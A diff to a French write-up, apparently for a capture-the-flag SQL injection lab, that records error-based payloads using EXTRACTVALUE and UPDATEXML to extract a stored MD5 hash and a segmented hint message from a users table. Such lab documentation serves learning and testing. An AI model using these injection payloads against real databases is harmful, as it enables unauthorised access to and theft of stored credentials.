@@ -36,10 +36,24 @@ L'affichage étant limité à un résultat par erreur, nous avons utilisé la cl
 * **Résultat :** Colonne `countersign` identifiée.
 * **Preuve visuelle :** `screenshots/4. Énumération des Colonnes (Le pivot).png`
 
-### Étape 5 : Extraction du Flag Final
-Extraction du contenu (hash) stocké dans la colonne `countersign`.
+### Étape 5 : Extraction du hash stocké dans `countersign`
+Extraction du contenu stocké dans la colonne `countersign`.
 * **Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT substring(countersign, 1, 64) FROM users LIMIT 1), 0x7e))`
-* **Résultat (Flag) :** `2b3366bcfd44f540e630d4dc2b9b06d9`
+* **Résultat :** `2b3366bcfd44f540e630d4dc2b9b06d9`
 * **Preuve visuelle :** `screenshots/5. Extraction finale du Flag.png`
+  Cette valeur correspond à un hash MD5.
+* **Preuve visuelle :** `screenshots/5. Extraction countersign.png`
+  
+### Étape 6 : Extraction de l’indice applicatif (`Commentaire`)
+L’analyse de la colonne `Commentaire` a permis d’extraire un message servant d’indication pour la suite de l’exploitation.  
+En raison des limitations d’affichage, l’extraction a été réalisée en plusieurs segments à l’aide de `UPDATEXML`.
 
----
+* **Payload (partie 1) :**`1 AND UPDATEXML(1, CONCAT(0x7e,(SELECT SUBSTRING(Commentaire,1,32) FROM users LIMIT 3,1),0x7e), 1)*`
+* **Payload (partie 1) :**`1 AND UPDATEXML(1, CONCAT(0x7e,(SELECT SUBSTRING(Commentaire,33,32) FROM users LIMIT 3,1),0x7e), 1)*`
+* **Payload (partie 1) :**`1 AND UPDATEXML(1, CONCAT(0x7e,(SELECT SUBSTRING(Commentaire,65,32) FROM users LIMIT 3,1),0x7e), 1)*`
+* **Message reconstitué :** Decrypt this password -> then lower all the char. sha256 on it and it's good !
+* **Preuves visuelles: **
+screenshots/6.1 Commentaire_part1.png
+screenshots/6.2 Commentaire_part2.png
+screenshots/6.3 Commentaire_part3.png
+  
